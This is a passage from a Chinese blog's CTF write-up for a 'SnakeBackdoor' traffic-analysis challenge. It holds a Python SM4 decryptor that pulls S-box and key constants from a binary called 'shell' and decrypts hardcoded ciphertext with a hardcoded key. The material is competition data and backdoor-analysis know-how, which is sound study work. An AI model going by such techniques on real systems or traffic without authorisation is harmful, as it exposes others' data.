<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def read_params(path):</span><br><span class="line">    with open(path, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    sbox = data[0x2020:0x2020+256]</span><br><span class="line">    fk = [struct.unpack_from(&#x27;&lt;I&#x27;, data, 0x2120+i*4)[0] for i in range(4)]</span><br><span class="line">    ck = [struct.unpack_from(&#x27;&lt;I&#x27;, data, 0x2140+i*4)[0] for i in range(32)]</span><br><span class="line">    return sbox, fk, ck</span><br><span class="line"></span><br><span class="line">def rol(x, n):</span><br><span class="line">    return ((x &lt;&lt; n) | (x &gt;&gt; (32 - n))) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">class SM4:</span><br><span class="line">    def __init__(self, sbox, fk, ck):</span><br><span class="line">        self.sbox = sbox</span><br><span class="line">        self.fk = fk</span><br><span class="line">        self.ck = ck</span><br><span class="line">    </span><br><span class="line">    def tau(self, x):</span><br><span class="line">        b0 = x &amp; 0xFF</span><br><span class="line">        b1 = (x &gt;&gt; 8) &amp; 0xFF</span><br><span class="line">        b2 = (x &gt;&gt; 16) &amp; 0xFF</span><br><span class="line">        b3 = (x &gt;&gt; 24) &amp; 0xFF</span><br><span class="line">        return ((self.sbox[b0] &lt;&lt; 24) | </span><br><span class="line">                (self.sbox[b1] &lt;&lt; 16) | </span><br><span class="line">                (self.sbox[b2] &lt;&lt; 8) | </span><br><span class="line">                self.sbox[b3])</span><br><span class="line">    </span><br><span class="line">    def L(self, x):</span><br><span class="line">        return x ^ rol(x, 2) ^ rol(x, 10) ^ rol(x, 18) ^ rol(x, 24)</span><br><span class="line">    </span><br><span class="line">    def Lp(self, x):</span><br><span class="line">        return x ^ rol(x, 13) ^ rol(x, 23)</span><br><span class="line">    </span><br><span class="line">    def T(self, x):</span><br><span class="line">        return self.L(self.tau(x))</span><br><span class="line">    </span><br><span class="line">    def Tp(self, x):</span><br><span class="line">        return self.Lp(self.tau(x))</span><br><span class="line">    </span><br><span class="line">    def expand(self, key, encrypt):</span><br><span class="line">        if len(key) != 16:</span><br><span class="line">            raise ValueError(&quot;Key must be 16 bytes&quot;)</span><br><span class="line">        </span><br><span class="line">        K = []</span><br><span class="line">        for i in range(4):</span><br><span class="line">            word = ((key[i*4] &lt;&lt; 24) |</span><br><span class="line">                    (key[i*4+1] &lt;&lt; 16) |</span><br><span class="line">                    (key[i*4+2] &lt;&lt; 8) |</span><br><span class="line">                    key[i*4+3])</span><br><span class="line">            K.append(word ^ self.fk[i])</span><br><span class="line">        </span><br><span class="line">        rk = [0] * 32</span><br><span class="line">        for i in range(32):</span><br><span class="line">            tmp = K[1] ^ K[2] ^ K[3] ^ self.ck[i]</span><br><span class="line">            newk = K[0] ^ self.Tp(tmp)</span><br><span class="line">            </span><br><span class="line">            if encrypt:</span><br><span class="line">                rk[i] = newk</span><br><span class="line">            else:</span><br><span class="line">                rk[31-i] = newk</span><br><span class="line">            </span><br><span class="line">            K = [K[1], K[2], K[3], newk]</span><br><span class="line">        </span><br><span class="line">        return rk</span><br><span class="line">    </span><br><span class="line">    def process(self, rk, block):</span><br><span class="line">        if len(block) != 16:</span><br><span class="line">            raise ValueError(&quot;Block must be 16 bytes&quot;)</span><br><span class="line">        </span><br><span class="line">        X = []</span><br><span class="line">        for i in range(4):</span><br><span class="line">            word = ((block[i*4] &lt;&lt; 24) |</span><br><span class="line">                    (block[i*4+1] &lt;&lt; 16) |</span><br><span class="line">                    (block[i*4+2] &lt;&lt; 8) |</span><br><span class="line">                    block[i*4+3])</span><br><span class="line">            X.append(word)</span><br><span class="line">        </span><br><span class="line">        for i in range(32):</span><br><span class="line">            tmp = rk[i] ^ X[1] ^ X[2] ^ X[3]</span><br><span class="line">            newx = X[0] ^ self.T(tmp)</span><br><span class="line">            X = [X[1], X[2], X[3], newx]</span><br><span class="line">        </span><br><span class="line">        out = b&#x27;&#x27;</span><br><span class="line">        for i in [3, 2, 1, 0]:</span><br><span class="line">            out += bytes([(X[i] &gt;&gt; 24) &amp; 0xFF,</span><br><span class="line">                         (X[i] &gt;&gt; 16) &amp; 0xFF,</span><br><span class="line">                         (X[i] &gt;&gt; 8) &amp; 0xFF,</span><br><span class="line">                         X[i] &amp; 0xFF])</span><br><span class="line">        return out</span><br><span class="line">    </span><br><span class="line">    def decrypt(self, key, cipher):</span><br><span class="line">        rk = self.expand(key, False)</span><br><span class="line">        result = b&#x27;&#x27;</span><br><span class="line">        for i in range(0, len(cipher), 16):</span><br><span class="line">            block = cipher[i:i+16]</span><br><span class="line">            if len(block) == 16:</span><br><span class="line">                result += self.process(rk, block)</span><br><span class="line">        </span><br><span class="line">        if result:</span><br><span class="line">            pad = result[-1]</span><br><span class="line">            if 0 &lt; pad &lt;= 16:</span><br><span class="line">                result = result[:-pad]</span><br><span class="line">        </span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    binary_path = &quot;shell&quot;</span><br><span class="line">    sbox, fk, ck = read_params(binary_path)</span><br><span class="line">    cipher = SM4(sbox, fk, ck)</span><br><span class="line">    </span><br><span class="line">    key_hex = &quot;ac46fb610b313b4f32fc642d8834b456&quot;</span><br><span class="line">    key_bytes = bytes.fromhex(key_hex)</span><br><span class="line">    </span><br><span class="line">    ciphertext_hex = (</span><br><span class="line">        &quot;49b351855f211b85bd012f80ce8ed5b3&quot;</span><br><span class="line">        &quot;2cc5becb37ca595a89445461c6512efc&quot;</span><br><span class="line">        &quot;b863696da0c6bb28da46e09069dd644f&quot;</span><br><span class="line">        &quot;87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7&quot;</span><br><span class="line">        &quot;b7c88bb0d92308a57f83d08a90ae024c&quot;</span><br><span class="line">        &quot;4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770&quot;</span><br><span class="line">        &quot;7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729&quot;</span><br><span class="line">    )</span><br><span class="line">    ciphertext_hex = ciphertext_hex.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line">    ciphertext_bytes = bytes.fromhex(ciphertext_hex)</span><br><span class="line">    </span><br><span class="line">    plaintext = cipher.decrypt(key_bytes, ciphertext_bytes)</span><br><span class="line">    print(plaintext)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://pic1.imgdb.cn/item/69510f06a0c391c56de5e3dd.png"></p>
<p>得到结果</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://tgvhzg.github.io">JiuCheng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://tgvhzg.github.io/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/">https://tgvhzg.github.io/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/pic/back6.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/25/pyminifier/" title="pyminifier混淆器"><img class="cover" src="/pic/back5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">pyminifier混淆器</div></div><div class="info-2"><div class="info-item-1">pyminifier项目地址Pyminifier 是一个 Python 代码压缩器、混淆器和压缩器 https://github.com/liftoff/pyminifier 安装这里以Ubuntu为例（在虚拟环境下） 下载源码包123wget https://files.pythonhosted.org/packages/source/p/pyminifier/pyminifier-2.1.tar.gztar -xzvf pyminifier-2.1.tar.gzcd pyminifier-2.1  手动运行 2to3 转换代码12to3 -w .  若没有2to3，安装即可 1sudo apt install 2to3  修改setup.py代码12345678910111213141516171819202122232425262728293031323334353637383940414243import sysimport pyminifierfrom setuptools import setupfrom distutils.command.install impor...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/21/DASCTF2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/" title="DASCTF2025下半年赛Misc复现"><img class="cover" src="/pic/back2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-21</div><div class="info-item-2">DASCTF2025下半年赛Misc复现</div></div><div class="info-2"><div class="info-item-1">DASCTF2025下半年赛Misc官方wp： https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg?singleDoc#RCpLM DigitalSignature题目描述： 12Find out the signer. Maybe you need EIP-191. Flag is account address that wrapped by DASCTF&#123;&#125;.找出签名者。可能需要使用EIP-191。Flag是包裹在DASCTF&#123;&#125;中的账户地址。  附件task.py内容为： 12345678910111213141516171819202122232425262728293031from web3 import Web3from eth_account.messages import encode_defunctfrom Crypto.Util.number import bytes_to_longdef SignMessage(Message: str,...</div></div></div></a><a class="pagination-related" href="/2025/12/18/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E7%BA%BF%E4%B8%8BMisc%E5%A4%8D%E7%8E%B0/" title="强网拟态线下Misc复现"><img class="cover" src="/pic/back.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-18</div><div class="info-item-2">强网拟态线下Misc复现</div></div><div class="info-2"><div class="info-item-1">强网拟态线下Misc复现复现参考： https://goodlunatic.github.io/posts/353513a/ https://0ran9e.fun/2025/11/30/qwnt/wp/ 泄漏的时间与电码123题目描述：你苦苦寻觅的东西或许就藏在他最显眼的地方hint1：ModR/M  附件有以下三个  其中chal是elf可执行文件，chal.py内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import timeimport randomimport sysclass SecureTypewriter:    def __init__(self):        self.lfsr = 0x92         self.time_unit = 0.005          self.jitter = 0.001        self.base_ov...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/pic/head1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">JiuCheng</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/TGVhZg"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is JiuCheng's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-ciscn%E5%88%9D%E8%B5%9BMisc-wp"><span class="toc-number">1.</span> <span class="toc-text">第三届“长城杯”&amp;ciscn初赛Misc wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AI%E5%AE%89%E5%85%A8"><span class="toc-number">1.1.</span> <span class="toc-text">AI安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Silent-Heist"><span class="toc-number">1.1.1.</span> <span class="toc-text">The Silent Heist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%BA%E8%AF%88%E7%8C%8E%E6%89%8B%E7%9A%84%E5%90%8E%E9%97%A8%E9%99%B7%E9%98%B1"><span class="toc-number">1.1.2.</span> <span class="toc-text">欺诈猎手的后门陷阱</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">SnakeBackdoor-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">SnakeBackdoor-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">SnakeBackdoor-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-4"><span class="toc-number">1.2.4.</span> <span class="toc-text">SnakeBackdoor-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-5"><span class="toc-number">1.2.5.</span> <span class="toc-text">SnakeBackdoor-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeBackdoor-6"><span class="toc-number">1.2.6.</span> <span class="toc-text">SnakeBackdoor-6</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/" title="第三届“长城杯”&amp;ciscn初赛Misc wp"><img src="/pic/back6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第三届“长城杯”&amp;ciscn初赛Misc wp"/></a><div class="content"><a class="title" href="/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/" title="第三届“长城杯”&amp;ciscn初赛Misc wp">第三届“长城杯”&amp;ciscn初赛Misc wp</a><time datetime="2025-12-28T09:40:01.904Z" title="Created 2025-12-28 17:40:01">2025-12-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/25/pyminifier/" title="pyminifier混淆器"><img src="/pic/back5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pyminifier混淆器"/></a><div class="content"><a class="title" href="/2025/12/25/pyminifier/" title="pyminifier混淆器">pyminifier混淆器</a><time datetime="2025-12-25T05:01:15.079Z" title="Created 2025-12-25 13:01:15">2025-12-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/22/zip%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" title="zip已知明文攻击"><img src="/pic/back4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zip已知明文攻击"/></a><div class="content"><a class="title" href="/2025/12/22/zip%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" title="zip已知明文攻击">zip已知明文攻击</a><time datetime="2025-12-22T10:22:16.691Z" title="Created 2025-12-22 18:22:16">2025-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/21/DASCTF2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/" title="DASCTF2025下半年赛Misc复现"><img src="/pic/back2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2025下半年赛Misc复现"/></a><div class="content"><a class="title" href="/2025/12/21/DASCTF2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/" title="DASCTF2025下半年赛Misc复现">DASCTF2025下半年赛Misc复现</a><time datetime="2025-12-21T04:23:18.722Z" title="Created 2025-12-21 12:23:18">2025-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title="内存取证-volatility3工具的使用"><img src="/pic/back3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内存取证-volatility3工具的使用"/></a><div class="content"><a class="title" href="/2025/12/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title="内存取证-volatility3工具的使用">内存取证-volatility3工具的使用</a><time datetime="2025-12-20T12:54:23.744Z" title="Created 2025-12-20 20:54:23">2025-12-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/pic/top_foot_img.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By JiuCheng</span></div><div class="footer_custom_text">I'm JiuCheng</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>